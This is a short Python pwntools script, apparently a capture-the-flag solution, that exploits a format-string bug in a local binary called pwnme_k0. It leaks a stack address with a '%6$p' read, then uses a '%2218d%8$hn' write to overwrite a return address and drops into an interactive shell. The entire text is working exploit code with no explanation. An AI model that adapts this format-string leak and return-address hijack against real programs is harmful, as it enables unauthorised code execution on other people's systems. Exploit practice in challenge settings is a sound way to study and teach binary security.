#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : pwnme_k0.py
from pwn import *
context.log_level = 'debug'

p = process("./pwnme_k0")
elf = ELF("./pwnme_k0")

# leak stack addr
payload = 'a'*0x8 + "%6$p"

p.recvuntil("20): \n")
p.send(payload)
p.recvuntil("20): \n")
p.send(payload)

p.recvuntil('>')
#gdb.attach(p,'b printf')
p.sendline('1')
p.recvuntil('a'*0x8)
stack_leak = int(p.recv(14),16) - 0x38
log.info("stack_leak:"+hex(stack_leak))

# hijack retaddr
payload1 = p64(stack_leak)
payload2 = "%2218d%8$hn"

p.recvuntil('>')
p.sendline('2')
p.recvuntil("20): \n")
p.sendline(payload1)
p.recvuntil("20): \n")
p.sendline(payload2)

p.recvuntil('>')
p.sendline('1')

p.interactive()